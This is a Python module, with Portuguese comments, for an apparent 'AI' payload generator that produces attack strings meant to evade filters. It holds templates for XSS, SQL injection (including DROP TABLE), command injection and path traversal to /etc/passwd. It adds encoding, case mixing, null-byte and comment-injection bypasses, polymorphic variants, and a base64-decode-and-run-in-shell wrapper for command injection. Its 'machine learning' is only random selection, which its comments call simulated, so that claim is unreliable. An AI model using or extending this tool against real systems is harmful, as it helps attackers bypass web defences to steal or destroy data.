
import random
import string
import base64
from typing import List, Dict, Any
import hashlib
import asyncio
from ai_modules.core.ai_engine import AIEngine

class PayloadGeneratorAI:
    """
    IA Avançada para Geração de Payloads
    Utiliza machine learning para criar payloads únicos e evasivos
    """
    
    def __init__(self, ai_engine: AIEngine):
        self.ai_engine = ai_engine
        self.payload_templates = self._load_payload_templates()
        self.evasion_techniques = self._load_evasion_techniques()
        
    def _load_payload_templates(self):
        """Carregar templates de payloads base"""
        return {
            'xss': [
                '<script>alert("XSS")</script>',
                '"><img src=x onerror=alert("XSS")>',
                'javascript:alert("XSS")',
                '<svg onload=alert("XSS")>',
                '&lt;script&gt;alert("XSS")&lt;/script&gt;'
            ],
            'sqli': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL,NULL,NULL--",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' OR 1=1#"
            ],
            'rce': [
                "; ls -la",
                "& dir",
                "| whoami",
                "`id`",
                "$(uname -a)"
            ],
            'lfi': [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "php://filter/read=convert.base64-encode/resource=index.php"
            ]
        }
    
    def _load_evasion_techniques(self):
        """Carregar técnicas de evasão"""
        return {
            'encoding': ['url', 'html', 'base64', 'unicode', 'hex'],
            'obfuscation': ['string_split', 'char_code', 'eval', 'fromCharCode'],
            'bypass': ['case_variation', 'null_bytes', 'comment_injection', 'whitespace']
        }
    
    async def generate_advanced_payload(self, attack_type: str, target_context: str = "web") -> Dict[str, Any]:
        """Gerar payload avançado com IA"""
        
        # Selecionar template base
        base_payload = random.choice(self.payload_templates.get(attack_type, ['']))
        
        # Aplicar técnicas de evasão com IA
        evasive_payload = await self._apply_ai_evasion(base_payload, attack_type)
        
        # Gerar variações
        variations = await self._generate_variations(evasive_payload, attack_type)
        
        return {
            'primary_payload': evasive_payload,
            'variations': variations,
            'attack_type': attack_type,
            'evasion_score': await self._calculate_evasion_score(evasive_payload),
            'target_context': target_context,
            'generated_at': asyncio.get_event_loop().time()
        }
    
    async def _apply_ai_evasion(self, payload: str, attack_type: str) -> str:
        """Aplicar técnicas de evasão usando IA"""
        
        # Simular análise neural para evasão
        evasion_techniques = random.sample(self.evasion_techniques['encoding'], 2)
        
        evasive_payload = payload
        
        for technique in evasion_techniques:
            if technique == 'url':
                evasive_payload = self._url_encode_random(evasive_payload)
            elif technique == 'html':
                evasive_payload = self._html_encode_random(evasive_payload)
            elif technique == 'unicode':
                evasive_payload = self._unicode_encode_random(evasive_payload)
            elif technique == 'base64':
                if attack_type == 'rce':
                    evasive_payload = f"echo {base64.b64encode(evasive_payload.encode()).decode()} | base64 -d | sh"
        
        return evasive_payload
    
    def _url_encode_random(self, payload: str) -> str:
        """Codificar URL de forma aleatória"""
        encoded = ""
        for char in payload:
            if random.random() > 0.7:  # 30% chance de codificar
                encoded += f"%{ord(char):02x}"
            else:
                encoded += char
        return encoded
    
    def _html_encode_random(self, payload: str) -> str:
        """Codificar HTML de forma aleatória"""
        html_entities = {
            '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;',
            '&': '&amp;', '(': '&#40;', ')': '&#41;'
        }
        
        encoded = ""
        for char in payload:
            if char in html_entities and random.random() > 0.6:
                encoded += html_entities[char]
            else:
                encoded += char
        return encoded
    
    def _unicode_encode_random(self, payload: str) -> str:
        """Codificar Unicode de forma aleatória"""
        encoded = ""
        for char in payload:
            if random.random() > 0.8:  # 20% chance de codificar
                encoded += f"\\u{ord(char):04x}"
            else:
                encoded += char
        return encoded
    
    async def _generate_variations(self, payload: str, attack_type: str) -> List[str]:
        """Gerar variações do payload"""
        variations = []
        
        # Variação com case mixing
        variations.append(self._mix_case(payload))
        
        # Variação com comentários
        if attack_type == 'sqli':
            variations.append(payload.replace(' ', '/**/'))
            variations.append(payload + '-- -')
        
        # Variação com null bytes
        variations.append(payload.replace('/', '/\x00'))
        
        # Variação com espaços alternativos
        variations.append(payload.replace(' ', '\t').replace(' ', '\n'))
        
        return variations[:5]  # Limitar a 5 variações
    
    def _mix_case(self, payload: str) -> str:
        """Misturar case de forma aleatória"""
        result = ""
        for char in payload:
            if char.isalpha():
                result += char.upper() if random.random() > 0.5 else char.lower()
            else:
                result += char
        return result
    
    async def _calculate_evasion_score(self, payload: str) -> float:
        """Calcular score de evasão usando IA"""
        # Simular análise neural
        complexity_score = len(set(payload)) / len(payload) if payload else 0
        encoding_score = payload.count('%') + payload.count('&') + payload.count('\\')
        length_penalty = max(0, 1 - (len(payload) / 1000))
        
        evasion_score = (complexity_score * 0.4 + min(encoding_score / 10, 1) * 0.4 + length_penalty * 0.2)
        
        return min(evasion_score, 1.0)
    
    async def generate_polymorphic_payload(self, base_payload: str, iterations: int = 5) -> List[str]:
        """Gerar payloads polimórficos"""
        polymorphic_payloads = []
        
        for i in range(iterations):
            # Criar variação única
            variation = base_payload
            
            # Aplicar transformações aleatórias
            transformations = random.sample([
                self._add_junk_data,
                self._split_and_concat,
                self._use_alternative_functions,
                self._add_noise_comments
            ], 2)
            
            for transform in transformations:
                variation = transform(variation)
            
            polymorphic_payloads.append(variation)
        
        return polymorphic_payloads
    
    def _add_junk_data(self, payload: str) -> str:
        """Adicionar dados lixo"""
        junk = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
        return f"/*{junk}*/{payload}"
    
    def _split_and_concat(self, payload: str) -> str:
        """Dividir e concatenar string"""
        if len(payload) < 4:
            return payload
        
        mid = len(payload) // 2
        return f"'{payload[:mid]}'+'{payload[mid:]}'"
    
    def _use_alternative_functions(self, payload: str) -> str:
        """Usar funções alternativas"""
        alternatives = {
            'alert': ['confirm', 'prompt', 'console.log'],
            'document': ['window.document', 'top.document'],
            'eval': ['Function', 'setTimeout', 'setInterval']
        }
        
        for original, alts in alternatives.items():
            if original in payload:
                payload = payload.replace(original, random.choice(alts))
        
        return payload
    
    def _add_noise_comments(self, payload: str) -> str:
        """Adicionar comentários de ruído"""
        noise_comments = ['/*noise*/', '<!--comment-->', '/*bypass*/']
        comment = random.choice(noise_comments)
        
        # Inserir comentário em posição aleatória
        if len(payload) > 5:
            pos = random.randint(1, len(payload) - 1)
            return payload[:pos] + comment + payload[pos:]
        
        return payload + comment
